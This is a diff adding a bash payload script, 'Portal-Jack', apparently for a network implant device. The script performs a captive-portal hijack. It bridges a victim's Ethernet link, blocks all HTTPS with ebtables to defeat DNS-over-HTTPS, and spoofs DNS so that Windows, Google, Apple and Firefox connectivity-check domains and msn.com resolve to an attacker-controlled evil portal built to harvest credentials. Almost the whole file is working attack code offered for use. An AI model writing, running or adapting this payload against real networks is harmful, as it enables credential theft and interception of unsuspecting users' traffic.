@@ -1,0 +1,58 @@
+#!/bin/bash
+# Title:         Portal-Jack
+# Author:        Hackazillarex
+# Version:       1.0
+# Category:      Credentials
+# Target:        Any device behind an Ethernet connection
+# Description:   Captive portal hijack via DNS spoofing with DoH bypass.
+#                Blocks all HTTPS through the bridge to kill DNS-over-HTTPS,
+#                then SPOOFDNS redirects OS connectivity-check domains to
+#                an attacker-controlled evil portal server.
+
+# ========== CONFIGURATION ==========
+# Your Kali box LAN IP (run 'ip a' on Kali to find it)
+ATTACKER_IP="10.0.0.235"
+
+# ========== SETUP ==========
+LED SETUP
+
+# Bridge mode - victim traffic passes through, Squirrel gets its own IP
+NETMODE BRIDGE
+
+# Wait for bridge interface to come up
+sleep 5
+
+# ========== ATTACK ==========
+LED ATTACK
+
+# STEP 1: Kill ALL HTTPS (including DNS-over-HTTPS)
+# Modern browsers use encrypted DNS (DoH) over port 443, bypassing SPOOFDNS.
+# Nuclear option: block ALL HTTPS through the bridge with ebtables.
+# This kills DoH to ANY provider and forces plain DNS on port 53.
+# Side effect: victim can't browse HTTPS until "authenticated" just
+# like a real captive portal that blocks traffic before login.
+ebtables -A FORWARD --ip-proto tcp --ip-dport 443 -p ipv4 -j DROP
+
+# STEP 2: DNS Spoofing
+# Now that DoH is blocked, ALL DNS goes through plain UDP port 53.
+# SPOOFDNS intercepts these queries on the bridge interface.
+#
+# Two jobs:
+# 1. Connectivity-check domains → Windows detects "no internet"
+# 2. msn.com → Edge's default homepage. When Windows auto-opens Edge,
+#    it goes to msn.com which now resolves to the attacker's server.
+SPOOFDNS br-lan \
+    'www.msftconnecttest.com='${ATTACKER_IP} \
+    'msftconnecttest.com='${ATTACKER_IP} \
+    'www.msftncsi.com='${ATTACKER_IP} \
+    'edge-http.microsoft.com='${ATTACKER_IP} \
+    '.*.connectivitycheck.gstatic.com='${ATTACKER_IP} \
+    'connectivitycheck.gstatic.com='${ATTACKER_IP} \
+    '.*.clients3.google.com='${ATTACKER_IP} \
+    'clients3.google.com='${ATTACKER_IP} \
+    'captive.apple.com='${ATTACKER_IP} \
+    'detectportal.firefox.com='${ATTACKER_IP} \
+    'www.msn.com='${ATTACKER_IP} \
+    'msn.com='${ATTACKER_IP}
+
+# Keep running until button press or power off
